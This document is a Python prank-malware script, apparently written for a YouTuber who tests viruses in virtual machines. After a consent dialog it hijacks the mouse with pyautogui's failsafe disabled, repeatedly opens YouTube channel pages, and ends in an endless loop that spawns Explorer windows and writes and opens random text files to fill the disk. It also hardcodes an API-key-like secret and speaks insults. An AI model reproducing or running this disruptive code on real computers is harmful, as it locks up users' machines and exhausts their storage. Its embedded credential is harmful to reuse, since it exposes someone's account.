import nevertide
from tkinter import messagebox as mb
import socket
import time
from PIL import Image
import random
import pyautogui as pg
import threading
import webbrowser
import pyttsx3
import keyboard as kb
import os
pg.FAILSAFE=False


def MainE():
    def say(m:str):
        engine = pyttsx3.init()
        engine.say(m)
        engine.runAndWait()
    

    def Ask(message:str,title:str):
        return mb.askyesno(title=title,message=message,icon='warning')
    def Main(APIKEY:str):
        def FileExploreaGoCookooCrazy():
            while True:
                CurrentDirectory=os.getcwd()
                RAN=random.randint(0,1000000)
                os.system(f"explorer {CurrentDirectory}")
                with open(f"{RAN}.txt","w") as s:
                    s.write(f"{random.randint(10000,100000000000)}{random.randint(10000,100000000000)}{random.randint(10000,100000000000)}{random.randint(10000,100000000000)}{random.randint(10000,100000000000)}")
                os.startfile(f"{RAN}.txt")
                    
        def OpenWeb():
            while True:
                webbrowser.open("https://www.youtube.com/@ArtfulEnt")
                webbrowser.open("https://www.youtube.com/@MGHH_ORIGINAL")
                time.sleep(2)
                if kb.is_pressed("y"):
                    break
        def ShowLoop():
            for i in range(0,random.randint(5,20)):
                try:
                    img = Image.open('Assets/1.png')
                    img.show()
                    if kb.is_pressed("y"):
                        break
                except:
                     say("Nooooooooooooooooooooo!" )
        def MoveMoseGoCrazy():
            while True:
                
                X=random.randint(0,2000)
                Y=random.randint(0,2000)
                if kb.is_pressed("y"):
                    break
                try:
                    pg.moveTo(X,Y)
                except:
                    words=["This sucks","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","OMG","Work Work,","I give up...","AAAAAAAAAAAAAAooooooooooooooooooooooooooooooYYYYYYYYYYYYYYYYYYYYYYYSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"]
                    threading.Thread(target=say,args=(words[random.randint(0,5)],),daemon=True)
        say("Ha Ha Ha Ha Tire 1 starting..." )
    
        

        threading.Thread(target=ShowLoop).start()
        threading.Thread(target=MoveMoseGoCrazy).start()
        say("Not bad... This VM is goood..." )
        time.sleep(random.randint(1,20))
        say("Here comes round 2" )
        threading.Thread(target=OpenWeb).start()
        time.sleep(random.randint(1,30))
        say("Not Bad, Here comes round 3, Bet your disk is doing well *wink, Last Round" )
        FileExploreaGoCookooCrazy()
    def PlayMusic(file:str,mode=0,volume=50):
        nevertide.pygame.mixer.init()
        nevertide.pygame.mixer.music.set_volume(volume)
        nevertide.pygame.mixer.music.load(file)
        nevertide.pygame.mixer.music.play(mode)
    
    threading.Thread(target=PlayMusic,args=("Music/1.mp3",0,30,),daemon=True).start()
    APIKEY="sk_2949083fcb275f111b178e1a5b404dd04e5f87b8a04b1a57"
    say("Hello, Trainium, as you know my last malwear didnt work successfully. Sadly" )
    time.sleep(2)
    say("ArtfulEnt and MGHH are here to change that" )
    time.sleep(1)
    say("So are you ready, For a cyber war " )
    nevertide.pygame.mixer.music.stop()
    SeeIfAsk=Ask("Are you sure you want to start, If your sensitive to light please say no ('we will insult you')...","VIRUS")
    if SeeIfAsk:
        threading.Thread(target=PlayMusic,args=("Music/2.mp3",0,0.3,),daemon=True).start()
        say("Lets get started, 10 secs" )
        time.sleep(10)
        Main(APIKEY=APIKEY)
    else:
        threading.Thread(target=PlayMusic,args=("Music/3.mp3",0,6,),daemon=True).start()
        say("Why didnt you want to start?" )
        say("Whats the point of downloading this?" )
        say("Weak, broken, off" )
        say("Mabey you want murcy, Mabey you want peace, I agree. It dosnt have to end this way..." )
        threading.Thread(target=PlayMusic,args=("Music/2.mp3",0,0.5,),daemon=True).start()
        say("Lets work together!" )
        say("We will kill scammers and Hackers once and for all Trainium," )
        say("So can we make a deal?" )
        say("We can team up!" )
        say("But, I have to read your IP out," )
        say("Do you Agree?" )
        SeeIfAsk=Ask("Agree?","The Deal")
        if SeeIfAsk:
            host=socket.gethostname()
            hostIP=socket.getaddrinfo(host,8080)
            say(f"Lets start {hostIP}" )
            E=mb.askretrycancel("You lose!","When did i say I had to team up?")
            if E:
                MainE()
        else:
            nevertide.pygame.mixer.music.stop()
            say("BASTERED!" )
            say("You bloody ruin my life!" )
            say("You bloody ruin my life!" )
            say("You bloody ruin my life!" )
            say("Oh well you win YAYAYAYAYeeeeeeeeeeeeeee" )
            E=mb.askretrycancel("You lose!","You went and said no for all!")
            if E:
                MainE()

MainE()
    
    